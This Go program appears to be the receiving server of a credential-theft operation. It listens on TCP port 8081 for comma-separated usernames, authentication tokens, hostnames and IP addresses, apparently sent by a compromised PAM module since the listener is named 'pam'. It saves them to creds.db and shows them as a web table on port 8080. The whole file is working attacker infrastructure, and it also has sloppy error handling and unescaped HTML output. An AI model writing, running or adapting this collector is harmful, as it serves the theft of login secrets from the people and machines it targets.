package main

import (
	"database/sql"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

func handleCredentialRequest(conn net.Conn, db *sql.DB) {
	buf := make([]byte, 512)
	conn.Read(buf)
	conn.Close()
	fields := strings.Split(string(buf), ",")

	stmt, _ := db.Prepare("INSERT INTO credentials(user, authtok, hostname, ipaddr) values(?,?,?,?)")
	stmt.Exec(fields[0], fields[1], fields[2], fields[3])
}

func createCredentialTable(db *sql.DB) {
	credentialTable := `CREATE TABLE IF NOT EXISTS credentials (
		"id" integer NOT NULL PRIMARY KEY AUTOINCREMENT,		
		"user" TEXT,
		"authtok" TEXT,
		"hostname" TEXT,
		"ipaddr" TEXT		
	  );`

	statement, err := db.Prepare(credentialTable)
	if err != nil {
		log.Fatal(err.Error())
	}
	statement.Exec()
	log.Println("credentialTable created")
}

func handler(w http.ResponseWriter, db *sql.DB) {
	rows, _ := db.Query("select * from credentials")
	defer rows.Close()

	html := `
	<!DOCTYPE html>
<html>
<style>
table, th, td {
  border:1px solid black;
}
</style>
<body>

<h2>Credentials</h2>

<table style="width:100%">
  <tr>
    <th>user</th>
    <th>authtok</th>
    <th>hostname</th>
    <th>hostname</th>
  </tr>
	`

	for rows.Next() {
		var id int
		var user string
		var authtok string
		var hostname string
		var ipaddr string
		rows.Scan(
			&id,
			&user,
			&authtok,
			&hostname,
			&ipaddr,
		)
		html += `
		<tr>
		  <td>` + user + `</td>
		  <td>` + authtok + `</td>
		  <td>` + hostname + `</td>
		  <td>` + ipaddr + `</td>
		</tr>`
	}

	fmt.Fprintf(w, html+`
	</table>
	</body>
	</html>`)
}

func main() {
	db, err := sql.Open("sqlite3", "./creds.db")
	createCredentialTable(db)

	pam, err := net.Listen("tcp", ":8081")
	if err != nil {
		log.Fatalln("error starting creds server")
	}
	defer pam.Close()

	go func() {
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { handler(w, db) })
		log.Fatal(http.ListenAndServe(":8080", nil))
	}()

	for {
		conn, _ := pam.Accept()
		go handleCredentialRequest(conn, db)
	}
}
